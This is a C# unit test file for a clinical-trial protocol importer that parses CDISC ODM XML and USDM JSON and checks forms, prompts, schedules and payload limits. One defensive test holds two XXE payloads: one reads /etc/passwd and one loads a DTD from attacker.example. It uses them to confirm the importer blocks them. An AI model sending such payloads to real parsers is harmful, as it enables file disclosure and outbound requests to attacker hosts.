using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;

using Cadence.Ddf;
using Cadence.Kernel;
using Cadence.Kernel.Knowledge;
using Cadence.Kernel.Protocol.Design;
using Cadence.Kernel.Protocol.Import;

using FluentAssertions;

using Xunit;

namespace Cadence.UnitTests.Packages;

/// <summary>
/// Unit tests for <see cref="OdmDesignImporter"/>, <see cref="CdiscLibraryTemplateCatalog"/>, and
/// <see cref="ProtocolDesignImporterService"/> covering all 36 bundled CDISC Library eCRF files, item prompts, display
/// order, mandatory flags, import notes, 10 MB payload limits, and DTD/XXE blocking.
/// </summary>
[Trait("Category", "Unit")]
public sealed class OdmDesignImporterTests
{
    private static ProtocolConceptResolver AlwaysSponsorConcept() =>
        (candidate, _) =>
        {
            var concept = new ConceptRef(ConceptId.New(), 1);
            var usedFallback = !string.IsNullOrWhiteSpace(candidate.BiomedicalConceptCode);
            return ValueTask.FromResult(new ProtocolConceptResolution(concept, UsedFallbackSponsorConcept: usedFallback));
        };

    [Fact]
    public void BundledCatalog_DiscoversAll36CdiscLibraryTemplates()
    {
        var catalog = new CdiscLibraryTemplateCatalog();

        var templates = catalog.ListTemplates();

        templates.Should().HaveCount(36);
        templates.Select(t => t.Id).Should().OnlyHaveUniqueItems();
        templates.Should().Contain(t => t.FileName == "AE_XML.xml" && t.FormName.Length > 0 && t.ItemCount > 0);
        templates.Should().Contain(t => t.FileName == "LB_LOCAL_XML.txt" && t.ItemCount > 0);
        templates.Should().Contain(t => t.FileName == "DD_XML.xml" && t.ItemCount > 0);
    }

    [Fact]
    public async Task All36BundledCdiscTemplates_PreserveFormNamesPromptsOrderAndMandatoryFlags()
    {
        var catalog = new CdiscLibraryTemplateCatalog();
        var service = new ProtocolDesignImporterService(catalog);
        var templates = catalog.ListTemplates();
        templates.Should().HaveCount(36);

        foreach (var template in templates)
        {
            var rawBytes = catalog.ReadTemplateBytes(template.Id);
            rawBytes.Should().NotBeNull($"template {template.Id} ({template.FileName}) must be readable");

            var result = await service.ImportAsync(
                new ProtocolDesignImportRequest(RawBytes: rawBytes, FileName: template.FileName, Format: ProtocolImportFormat.OdmXml),
                AlwaysSponsorConcept(),
                TestContext.Current.CancellationToken);

            result.IsSuccess.Should().BeTrue($"template {template.Id} ({template.FileName}) failed with: {string.Join("; ", result.Problems)}");
            result.Design.Should().NotBeNull();

            // Verify round-trip through canonical ProtocolDesignDocument reader/writer.
            var roundTrip = ProtocolDesignDocument.Read(ProtocolDesignDocument.Write(result.Design!));
            roundTrip.IsValid.Should().BeTrue($"template {template.Id} produced invalid ProtocolDesign: {string.Join("; ", roundTrip.Problems)}");

            // Compare directly against raw XML expectations for form name, item count, order, prompt, and mandatory flag.
            var expectedForms = ReadExpectedOdmForms(rawBytes!);
            result.Design!.CollectionSpecs.Should().HaveCount(expectedForms.Count, $"template {template.FileName}");

            for (int f = 0; f < expectedForms.Count; f++)
            {
                var expectedForm = expectedForms[f];
                var actualForm = result.Design.CollectionSpecs[f];

                actualForm.Name.Should().Be(expectedForm.Name, $"form name in {template.FileName}");
                actualForm.Items.Should().HaveCount(expectedForm.Items.Count, $"item count in {template.FileName}");

                for (int i = 0; i < expectedForm.Items.Count; i++)
                {
                    var expItem = expectedForm.Items[i];
                    var actItem = actualForm.Items[i];
                    actItem.Prompt.Should().Be(expItem.Prompt, $"prompt at position {i + 1} ({expItem.ItemOid}) in {template.FileName}");
                    actItem.Required.Should().Be(expItem.Mandatory, $"mandatory flag at position {i + 1} ({expItem.ItemOid}) in {template.FileName}");
                }
            }
        }
    }

    [Fact]
    public async Task ImportingAll36TemplatesTogether_DisambiguatesDuplicateOidsAndProducesValidDesign()
    {
        var catalog = new CdiscLibraryTemplateCatalog();
        var service = new ProtocolDesignImporterService(catalog);
        var allIds = catalog.ListTemplates().Select(t => t.Id).ToList();

        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(TemplateIds: allIds, FallbackTitle: "Combined CDISC eCRF Suite"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeTrue(string.Join("; ", result.Problems));
        result.Design!.CollectionSpecs.Should().HaveCountGreaterThanOrEqualTo(36);
        result.Design.Elements().Select(e => e.Id).Should().OnlyHaveUniqueItems();
    }

    [Fact]
    public async Task OdmWithUnmappedTerminologyAndVendorExtensions_AttachesReadableImportNotes()
    {
        const string odm = """
            <?xml version="1.0" encoding="UTF-8"?>
            <ODM xmlns="http://www.cdisc.org/ns/odm/v1.3"
                 xmlns:mdsol="http://www.mdsol.com/ns/odm/metadata"
                 FileOID="ODM.VENDOR.1"
                 FileType="Snapshot"
                 ODMVersion="1.3.2"
                 CreationDateTime="2026-01-10T00:00:00Z"
                 Originator="Sponsor EDC">
              <Study OID="S.101">
                <GlobalVariables>
                  <StudyName>Vendor Annotated Study</StudyName>
                  <StudyDescription>Test</StudyDescription>
                  <ProtocolName>VAS-101</ProtocolName>
                </GlobalVariables>
                <MetaDataVersion OID="MDV.1" Name="v1">
                  <FormDef OID="F.VITALS" Name="Vital Signs" Repeating="No" mdsol:ControlType="Grid">
                    <ItemGroupRef ItemGroupOID="IG.VITALS" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <ItemGroupDef OID="IG.VITALS" Name="Vitals Group" Repeating="No">
                    <ItemRef ItemOID="IT.POS" OrderNumber="2" Mandatory="No"/>
                    <ItemRef ItemOID="IT.SYSBP" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemDef OID="IT.SYSBP" Name="SYSBP" DataType="integer" CustomVendorAttr="custom-flag">
                    <Question><TranslatedText xml:lang="en">Systolic Blood Pressure (mmHg)</TranslatedText></Question>
                    <Alias Context="CDASH/SDTM" Name="extCodeID: C25298"/>
                  </ItemDef>
                  <ItemDef OID="IT.POS" Name="VSPOS" DataType="text">
                    <Alias Context="prompt" Name="Body Position"/>
                    <CodeListRef CodeListOID="CL.POS"/>
                  </ItemDef>
                  <CodeList OID="CL.POS" Name="Position" DataType="text">
                    <CodeListItem CodedValue="SITTING"><Decode><TranslatedText>Sitting</TranslatedText></Decode></CodeListItem>
                    <CodeListItem CodedValue="STANDING"><Decode><TranslatedText>Standing</TranslatedText></Decode></CodeListItem>
                  </CodeList>
                  <mdsol:CustomExtension OID="EXT.1"/>
                </MetaDataVersion>
              </Study>
            </ODM>
            """;

        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(odm), FileName: "vitals.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeTrue(string.Join("; ", result.Problems));
        var form = result.Design!.CollectionSpecs.Should().ContainSingle().Subject;
        form.Name.Should().Be("Vital Signs");

        // OrderNumber="1" (IT.SYSBP) must precede OrderNumber="2" (IT.POS) despite reversed document order.
        form.Items.Select(i => i.Prompt).Should().Equal("Systolic Blood Pressure (mmHg)", "Body Position");
        form.Items.Select(i => i.Required).Should().Equal(true, false);

        result.Notes.Should().Contain(n => n.Message.Contains("Originator", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("ControlType", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("CustomVendorAttr", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("CustomExtension", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("CL.POS", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("C25298", StringComparison.Ordinal));
        result.Design.ImportNotes.Should().NotBeNullOrEmpty();
    }

    [Fact]
    public async Task OdmStudyEventDefsAndProtocolRefs_CompileEpochsPlannedActivitiesAndRepeatingFlags_WhileOmittingFalseRepeatingInJson()
    {
        const string odm = """
            <?xml version="1.0" encoding="UTF-8"?>
            <ODM xmlns="http://www.cdisc.org/ns/odm/v1.3"
                 FileOID="ODM.SCHEDULE.1"
                 FileType="Snapshot"
                 ODMVersion="1.3.2"
                 CreationDateTime="2026-03-01T00:00:00Z">
              <Study OID="S.SCHED">
                <GlobalVariables>
                  <StudyName>ODM Scheduled Visits Trial</StudyName>
                  <StudyDescription>Tests StudyEventDef compilation</StudyDescription>
                  <ProtocolName>ODM-SOA-1</ProtocolName>
                </GlobalVariables>
                <MetaDataVersion OID="MDV.1" Name="v1">
                  <Protocol>
                    <StudyEventRef StudyEventOID="SE.W4" OrderNumber="2" Mandatory="Yes"/>
                    <StudyEventRef StudyEventOID="SE.SCR" OrderNumber="1" Mandatory="Yes"/>
                    <StudyEventRef StudyEventOID="SE.CYCLE" OrderNumber="3" Mandatory="No"/>
                  </Protocol>
                  <StudyEventDef OID="SE.SCR" Name="Screening Visit" Repeating="No" Type="Scheduled">
                    <FormRef FormOID="F.VS" OrderNumber="2" Mandatory="Yes"/>
                    <FormRef FormOID="F.DM" OrderNumber="1" Mandatory="Yes"/>
                  </StudyEventDef>
                  <StudyEventDef OID="SE.W4" Name="Week 4 Visit" Repeating="No" Type="Scheduled">
                    <FormRef FormOID="F.VS" OrderNumber="1" Mandatory="Yes"/>
                  </StudyEventDef>
                  <StudyEventDef OID="SE.CYCLE" Name="Infusion Cycle" Repeating="Yes" Type="Scheduled">
                    <FormRef FormOID="F.VS" OrderNumber="1" Mandatory="Yes"/>
                  </StudyEventDef>
                  <StudyEventDef OID="SE.COMMON" Name="Common Adverse Events" Repeating="Yes" Type="Common">
                    <FormRef FormOID="F.AE" OrderNumber="1" Mandatory="No"/>
                  </StudyEventDef>
                  <FormDef OID="F.DM" Name="Demographics" Repeating="No">
                    <ItemGroupRef ItemGroupOID="IG.DM" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <FormDef OID="F.VS" Name="Vital Signs" Repeating="No">
                    <ItemGroupRef ItemGroupOID="IG.VS" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <FormDef OID="F.AE" Name="Adverse Events" Repeating="Yes">
                    <ItemGroupRef ItemGroupOID="IG.AE" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <ItemGroupDef OID="IG.DM" Name="Demographics" Repeating="No">
                    <ItemRef ItemOID="IT.AGE" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemGroupDef OID="IG.VS" Name="Vital Signs" Repeating="No">
                    <ItemRef ItemOID="IT.SBP" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemGroupDef OID="IG.AE" Name="Adverse Events" Repeating="Yes">
                    <ItemRef ItemOID="IT.AETERM" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemDef OID="IT.AGE" Name="AGE" DataType="integer">
                    <Question><TranslatedText>Age</TranslatedText></Question>
                  </ItemDef>
                  <ItemDef OID="IT.SBP" Name="SYSBP" DataType="integer">
                    <Question><TranslatedText>Systolic Blood Pressure</TranslatedText></Question>
                  </ItemDef>
                  <ItemDef OID="IT.AETERM" Name="AETERM" DataType="text">
                    <Question><TranslatedText>Reported Term for the Adverse Event</TranslatedText></Question>
                  </ItemDef>
                </MetaDataVersion>
              </Study>
            </ODM>
            """;

        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(odm), FileName: "schedule.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeTrue(string.Join("; ", result.Problems));
        var design = result.Design!;

        design.Epochs.Should().NotBeEmpty();
        design.PlannedActivities.Select(a => a.Id).Should().Equal("SE.SCR", "SE.W4", "SE.CYCLE");
        design.PlannedActivities.Single(a => a.Id == "SE.SCR").CollectionSpecIds.Should().Equal("F.DM", "F.VS");
        design.PlannedActivities.Single(a => a.Id == "SE.SCR").Repeating.Should().BeFalse();
        design.PlannedActivities.Single(a => a.Id == "SE.W4").Timing!.Day.Should().Be(28);
        design.PlannedActivities.Single(a => a.Id == "SE.CYCLE").Repeating.Should().BeTrue();

        design.CollectionSpecs.Single(s => s.Id == "F.DM").Repeating.Should().BeFalse();
        design.CollectionSpecs.Single(s => s.Id == "F.VS").Repeating.Should().BeFalse();
        design.CollectionSpecs.Single(s => s.Id == "F.AE").Repeating.Should().BeTrue();

        var canonical = ProtocolDesignDocument.Write(design);
        canonical.Should().NotContain("\"repeating\":false");
        canonical.Should().Contain("\"repeating\":true");

        var roundTrip = ProtocolDesignDocument.Read(canonical);
        roundTrip.IsValid.Should().BeTrue(string.Join("; ", roundTrip.Problems));
        roundTrip.Design!.CollectionSpecs.Single(s => s.Id == "F.AE").Repeating.Should().BeTrue();
        roundTrip.Design.PlannedActivities.Single(a => a.Id == "SE.CYCLE").Repeating.Should().BeTrue();

        var soa = ScheduleOfActivities.Compile(roundTrip.Design);
        soa.Columns.Single(c => c.ActivityId == "SE.CYCLE").Repeating.Should().BeTrue();
        soa.Columns.Single(c => c.ActivityId == "SE.SCR").Repeating.Should().BeFalse();
        soa.Rows.Single(r => r.CollectionSpecId == "F.AE").Repeating.Should().BeTrue();
        soa.Rows.Single(r => r.CollectionSpecId == "F.AE").Columns.Should().BeEmpty();
        soa.Rows.Single(r => r.CollectionSpecId == "F.VS").Repeating.Should().BeFalse();
    }

    [Fact]
    public async Task BundledTemplates_BuildDefaultStarterScheduleKeepRepeatingLogUnscheduledApplyAssignmentsAndMergeDraftSchedules()
    {
        var catalog = new CdiscLibraryTemplateCatalog();
        var templates = catalog.ListTemplates();
        var dmTemplate = templates.Single(t => t.FileName == "DM_XML.xml");
        var vsTemplate = templates.Single(t => t.FileName == "TIG_Vital_Signs_XML.xml");
        var repeatingTobacco = templates.Single(t => t.FileName == "TIG_Tobacco_Product_Events_or_Malfunctions_XML.xml");

        dmTemplate.Repeating.Should().BeFalse();
        repeatingTobacco.Repeating.Should().BeTrue();

        var service = new ProtocolDesignImporterService(catalog);

        // 1. Default template import schedules Vital Signs across all 4 starter visits, Demographics at Baseline, and leaves repeating logs unscheduled.
        var defaultImport = await service.ImportAsync(
            new ProtocolDesignImportRequest(
                TemplateIds: [vsTemplate.Id, dmTemplate.Id, repeatingTobacco.Id],
                FallbackTitle: "Starter Schedule Suite"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        defaultImport.IsSuccess.Should().BeTrue(string.Join("; ", defaultImport.Problems));
        var initialDesign = defaultImport.Design!;
        initialDesign.Epochs.Select(e => e.Id).Should().Equal("EP.SCREENING", "EP.TREATMENT", "EP.FOLLOWUP");
        initialDesign.PlannedActivities.Select(a => a.Id).Should().Equal("V.SCREENING", "V.BASELINE", "V.WEEK4", "V.EOS");

        var vsSpec = initialDesign.CollectionSpecs.Single(s => s.Name == vsTemplate.FormName);
        var dmSpec = initialDesign.CollectionSpecs.Single(s => s.Name == dmTemplate.FormName);
        var tobaccoSpec = initialDesign.CollectionSpecs.Single(s => s.Name == repeatingTobacco.FormName);
        vsSpec.Repeating.Should().BeFalse();
        dmSpec.Repeating.Should().BeFalse();
        tobaccoSpec.Repeating.Should().BeTrue();
        initialDesign.PlannedActivities.Should().AllSatisfy(a =>
        {
            a.CollectionSpecIds.Should().Contain(vsSpec.Id);
            a.CollectionSpecIds.Should().NotContain(tobaccoSpec.Id);
        });
        initialDesign.PlannedActivities.Single(a => a.Id == "V.BASELINE").CollectionSpecIds.Should().Contain(dmSpec.Id);
        initialDesign.PlannedActivities.Single(a => a.Id == "V.WEEK4").CollectionSpecIds.Should().NotContain(dmSpec.Id);

        // 2. Merging a designer-assigned template onto BaseDesign preserves existing epochs/visits and wires custom visits.
        var ecgTemplate = templates.Single(t => t.FileName == "TIG_Electrocardiogram_XML.xml");
        var mergedImport = await service.ImportAsync(
            new ProtocolDesignImportRequest(
                TemplateIds: [ecgTemplate.Id],
                BaseDesign: initialDesign,
                TemplateAssignments:
                [
                    new TemplateActivityAssignment(
                        ecgTemplate.Id,
                        ["V.SCREENING", "V.WEEK4"]),
                ]),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        mergedImport.IsSuccess.Should().BeTrue(string.Join("; ", mergedImport.Problems));
        var merged = mergedImport.Design!;
        var ecgSpec = merged.CollectionSpecs.Single(s => s.Name == ecgTemplate.FormName);
        merged.PlannedActivities.Single(a => a.Id == "V.SCREENING").CollectionSpecIds.Should().Contain([vsSpec.Id, ecgSpec.Id]);
        merged.PlannedActivities.Single(a => a.Id == "V.WEEK4").CollectionSpecIds.Should().Contain([vsSpec.Id, ecgSpec.Id]);
        merged.PlannedActivities.Single(a => a.Id == "V.BASELINE").CollectionSpecIds.Should().Contain([vsSpec.Id, dmSpec.Id]).And.NotContain(ecgSpec.Id);
        ProtocolDesignDocument.Read(ProtocolDesignDocument.Write(merged)).IsValid.Should().BeTrue();
    }

    [Fact]
    public async Task UsdmV4WithUnmappedConceptAndVendorExtension_CreatesDesignWithNotes()
    {
        const string usdm = """
            {
              "usdmVersion": "4.0.0",
              "study": {
                "id": "Study_USDM_1",
                "name": "CADENCE-USDM",
                "extensionAttributes": [
                  { "url": "https://vendor.example/usdm/edc-layout", "valueString": "compact" }
                ],
                "versions": [
                  {
                    "id": "SV_1",
                    "titles": [
                      { "id": "T_1", "text": "USDM Imported Trial", "type": { "code": "C207616", "decode": "Official Study Title" } }
                    ],
                    "biomedicalConcepts": [
                      {
                        "id": "BC_HR",
                        "name": "Heart Rate",
                        "label": "Pulse Rate (beats/min)",
                        "code": { "id": "AC_1", "standardCode": { "code": "C49677", "decode": "Heart Rate" } }
                      }
                    ],
                    "studyDesigns": [
                      {
                        "id": "SD_1",
                        "epochs": [ { "id": "EP_1", "name": "Screening" } ],
                        "encounters": [ { "id": "ENC_1", "name": "Screening Visit" } ],
                        "activities": [
                          { "id": "ACT_VITALS", "name": "Vital Signs Assessment", "biomedicalConceptIds": [ "BC_HR" ] }
                        ],
                        "scheduleTimelines": [
                          {
                            "id": "TL_1",
                            "mainTimeline": true,
                            "entryId": "SAI_1",
                            "instances": [
                              {
                                "id": "SAI_1",
                                "instanceType": "ScheduledActivityInstance",
                                "epochId": "EP_1",
                                "encounterId": "ENC_1",
                                "activityIds": [ "ACT_VITALS" ]
                              }
                            ],
                            "timings": [
                              {
                                "id": "TIM_1",
                                "type": { "code": "C71148", "decode": "Fixed Reference" },
                                "value": "P1D",
                                "relativeFromScheduledInstanceId": "SAI_1",
                                "relativeToScheduledInstanceId": "SAI_1"
                              }
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            }
            """;

        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(usdm), FileName: "study.json"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeTrue(string.Join("; ", result.Problems));
        result.Design!.Title.Should().Be("USDM Imported Trial");
        var spec = result.Design.CollectionSpecs.Should().ContainSingle().Subject;
        spec.Name.Should().Be("Vital Signs Assessment");
        spec.Items.Should().ContainSingle().Which.Prompt.Should().Be("Pulse Rate (beats/min)");
        result.Notes.Should().Contain(n => n.Message.Contains("C49677", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("edc-layout", StringComparison.Ordinal));
    }

    [Fact]
    public async Task OdmExceeding10Megabytes_IsRejectedSynchronously()
    {
        var oversized = new byte[IProtocolDesignImporter.MaxPayloadBytes + 1];
        Array.Fill(oversized, (byte)' ');

        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: oversized, FileName: "huge.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeFalse();
        result.PayloadTooLarge.Should().BeTrue();
        result.Problems.Should().ContainSingle(p => p.Contains("10 MB", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("<?xml version=\"1.0\"?><!DOCTYPE ODM [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><ODM>&xxe;</ODM>")]
    [InlineData("<?xml version=\"1.0\"?><!DOCTYPE ODM SYSTEM \"http://attacker.example/odm.dtd\"><ODM/>")]
    public async Task OdmWithDoctypeOrExternalEntity_IsBlocked(string xxePayload)
    {
        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(xxePayload), FileName: "xxe.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeFalse();
        result.Problems.Should().ContainSingle(p => p.Contains("DTD", StringComparison.OrdinalIgnoreCase) || p.Contains("DOCTYPE", StringComparison.OrdinalIgnoreCase));
    }

    [Theory]
    [InlineData("<ODM><Study><MetaDataVersion>", "Malformed ODM XML")]
    [InlineData("<NotODM/>", "Expected root <ODM>")]
    [InlineData("<ODM xmlns=\"http://www.cdisc.org/ns/odm/v1.3\"><Study OID=\"S1\"><MetaDataVersion OID=\"M1\"/></Study></ODM>", "no <FormDef>")]
    public async Task MalformedOdmXml_ReturnsActionableErrorMessages(string invalidXml, string expectedSubstring)
    {
        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(invalidXml), FileName: "broken.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeFalse();
        result.Problems.Should().Contain(p => p.Contains(expectedSubstring, StringComparison.OrdinalIgnoreCase));
    }

    private static List<ExpectedForm> ReadExpectedOdmForms(byte[] xmlBytes)
    {
        using var ms = new MemoryStream(xmlBytes, writable: false);
        var doc = XDocument.Load(ms);
        var mdv = doc.Descendants().First(e => e.Name.LocalName == "MetaDataVersion");
        var itemGroups = mdv.Elements()
            .Where(e => e.Name.LocalName == "ItemGroupDef")
            .ToDictionary(e => e.Attribute("OID")!.Value, StringComparer.Ordinal);
        var items = mdv.Elements()
            .Where(e => e.Name.LocalName == "ItemDef")
            .ToDictionary(e => e.Attribute("OID")!.Value, StringComparer.Ordinal);

        var list = new List<ExpectedForm>();
        foreach (var formDef in mdv.Elements().Where(e => e.Name.LocalName == "FormDef"))
        {
            var formName = formDef.Attribute("Name")?.Value?.Trim() ?? formDef.Attribute("OID")!.Value;
            var expectedItems = new List<ExpectedItem>();
            var orderedGroups = formDef.Elements()
                .Where(e => e.Name.LocalName == "ItemGroupRef")
                .Select((el, idx) => (Element: el, Order: ParseOrder(el), Index: idx))
                .OrderBy(x => x.Order)
                .ThenBy(x => x.Index)
                .Select(x => x.Element);

            foreach (var igRef in orderedGroups)
            {
                var igDef = itemGroups[igRef.Attribute("ItemGroupOID")!.Value];
                var orderedItemRefs = igDef.Elements()
                    .Where(e => e.Name.LocalName == "ItemRef")
                    .Select((el, idx) => (Element: el, Order: ParseOrder(el), Index: idx))
                    .OrderBy(x => x.Order)
                    .ThenBy(x => x.Index)
                    .Select(x => x.Element);

                foreach (var itemRef in orderedItemRefs)
                {
                    var oid = itemRef.Attribute("ItemOID")!.Value;
                    var mandatory = string.Equals(itemRef.Attribute("Mandatory")?.Value, "Yes", StringComparison.OrdinalIgnoreCase);
                    var itemDef = items[oid];
                    expectedItems.Add(new ExpectedItem(oid, ExpectedPrompt(itemDef), mandatory));
                }
            }

            list.Add(new ExpectedForm(formName, expectedItems));
        }

        return list;
    }

    private static int ParseOrder(XElement el) =>
        int.TryParse(el.Attribute("OrderNumber")?.Value, NumberStyles.Integer, CultureInfo.InvariantCulture, out var n)
            ? n
            : int.MaxValue;

    private static string ExpectedPrompt(XElement itemDef)
    {
        foreach (var alias in itemDef.Elements().Where(e => e.Name.LocalName == "Alias"))
        {
            var ctx = new string((alias.Attribute("Context")?.Value ?? string.Empty).Where(char.IsLetterOrDigit).ToArray());
            var name = alias.Attribute("Name")?.Value?.Trim();
            if (string.Equals(ctx, "prompt", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrWhiteSpace(name))
            {
                return name;
            }
        }

        var question = itemDef.Elements().FirstOrDefault(e => e.Name.LocalName == "Question")
            ?.Elements().FirstOrDefault(e => e.Name.LocalName == "TranslatedText")?.Value?.Trim();
        if (!string.IsNullOrWhiteSpace(question))
        {
            return string.Join(' ', question.Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries));
        }

        foreach (var alias in itemDef.Elements().Where(e => e.Name.LocalName == "Alias"))
        {
            var ctx = new string((alias.Attribute("Context")?.Value ?? string.Empty).Where(char.IsLetterOrDigit).ToArray());
            var name = alias.Attribute("Name")?.Value?.Trim();
            if (string.Equals(ctx, "questiontext", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrWhiteSpace(name))
            {
                return name;
            }
        }

        var desc = itemDef.Elements().FirstOrDefault(e => e.Name.LocalName == "Description")
            ?.Elements().FirstOrDefault(e => e.Name.LocalName == "TranslatedText")?.Value?.Trim();
        if (!string.IsNullOrWhiteSpace(desc))
        {
            return string.Join(' ', desc.Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries));
        }

        return itemDef.Attribute("Name")?.Value?.Trim() ?? itemDef.Attribute("OID")!.Value;
    }

    private sealed record ExpectedForm(string Name, List<ExpectedItem> Items);

    private sealed record ExpectedItem(string ItemOid, string Prompt, bool Mandatory);
}
